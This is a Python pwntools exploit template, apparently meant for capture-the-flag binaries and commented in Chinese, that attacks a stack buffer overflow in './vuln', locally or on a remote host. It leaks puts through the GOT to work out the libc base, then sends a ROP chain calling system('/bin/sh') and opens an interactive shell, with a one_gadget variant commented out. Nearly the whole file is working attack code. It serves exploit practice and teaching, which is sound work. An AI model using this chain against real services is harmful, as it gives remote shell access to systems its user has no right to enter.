#!/usr/bin/env python3
"""
ROP Chain Template with ret2libc
"""

from pwn import *

exe = "./vuln"
elf = context.binary = ELF(exe, checksec=False)
libc = ELF("./libc.so.6", checksec=False)
context.log_level = "info"


def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript="continue", *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], int(sys.argv[2]), *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


# ===== 查找 Gadgets =====
# 使用 ROPgadget: ROPgadget --binary vuln | grep "pop rdi"
pop_rdi = 0x401234  # pop rdi; ret
pop_rsi = 0x401236  # pop rsi; pop r15; ret
ret = 0x40101A  # ret (用於 stack alignment)

# ===== Stage 1: Leak Libc =====
io = start()

offset = 72

payload_leak = flat(
    {
        offset: [
            pop_rdi,
            elf.got["puts"],
            elf.plt["puts"],
            elf.symbols["main"],  # 回到 main 繼續利用
        ]
    }
)

io.sendlineafter(b"Input: ", payload_leak)
leaked = u64(io.recvline().strip().ljust(8, b"\x00"))
libc.address = leaked - libc.symbols["puts"]
info(f"Leaked puts: {hex(leaked)}")
info(f"Libc base: {hex(libc.address)}")

# ===== Stage 2: ret2libc / One Gadget =====
# Option 1: 使用 system('/bin/sh')
binsh = next(libc.search(b"/bin/sh\x00"))

payload_shell = flat(
    {
        offset: [
            ret,  # Stack alignment (必須！某些 libc 版本需要)
            pop_rdi,
            binsh,
            libc.symbols["system"],
        ]
    }
)

# Option 2: 使用 one_gadget (需先用 one_gadget 工具找)
# one_gadget = libc.address + 0x4526a
# payload_shell = flat({
#     offset: [
#         one_gadget,
#         b'\x00' * 0x40  # 滿足 constraints
#     ]
# })

io.sendlineafter(b"Input: ", payload_shell)

io.interactive()
